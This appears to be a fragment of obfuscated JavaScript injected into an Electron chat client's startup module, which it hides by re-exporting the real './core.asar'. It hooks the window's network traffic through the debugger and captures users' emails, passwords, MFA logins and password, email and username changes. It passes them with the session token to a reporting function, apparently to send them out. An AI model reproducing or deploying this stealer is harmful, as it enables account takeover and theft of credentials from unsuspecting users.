        if (_0x30186a.response.url.endsWith('/login')) {
          if (!_0x3454e4.token) {
            EMAIL = _0x187ced.login
            PASSWORD = _0x187ced.password
            return
          }
          cruise(
            'LOGIN_USER',
            _0x187ced.login,
            _0x187ced.password,
            _0x3454e4,
            _0x187ced,
            'LOGGED IN'
          )
        } else {
          if (_0x30186a.response.url.endsWith('/register')) {
            cruise(
              'LOGIN_USER',
              _0x187ced.email,
              _0x187ced.password,
              _0x3454e4,
              _0x187ced,
              'SIGNED UP'
            )
          } else {
            if (_0x30186a.response.url.endsWith('/totp')) {
              cruise(
                'LOGIN_USER',
                EMAIL,
                PASSWORD,
                _0x3454e4,
                _0x187ced,
                'LOGGED IN WITH MFA-2'
              )
            } else {
              if (_0x30186a.response.url.endsWith('/@me')) {
                if (!_0x187ced.password) {
                  return
                }
                if (_0x187ced.email) {
                  cruise(
                    'EMAIL_CHANGED',
                    _0x187ced.email,
                    _0x187ced.password,
                    _0x3454e4,
                    _0x187ced,
                    'CHANGED EMAIL'
                  )
                }
                if (_0x187ced.new_password) {
                  cruise(
                    'PASSWORD_CHANGED',
                    null,
                    null,
                    _0x3454e4,
                    _0x187ced,
                    'CHANGED PASSWORD'
                  )
                }
                if (_0x187ced.username) {
                  cruise(
                    'USERNAME_CHANGED',
                    null,
                    null,
                    _0x3454e4,
                    _0x187ced,
                    'CHANGED USERNAME'
                  )
                }
              }
            }
          }
        }
      }
    )
  _0x504e1a
    .getAllWindows()[0]
    .webContents.debugger.sendCommand('Network.enable')
  _0x504e1a
    .getAllWindows()[0]
    .on('closed', () => CREATE_WINDOW_CLIENT(BrowserWindow))
}
CREATE_WINDOW_CLIENT(BrowserWindow)
module.exports = require('./core.asar')
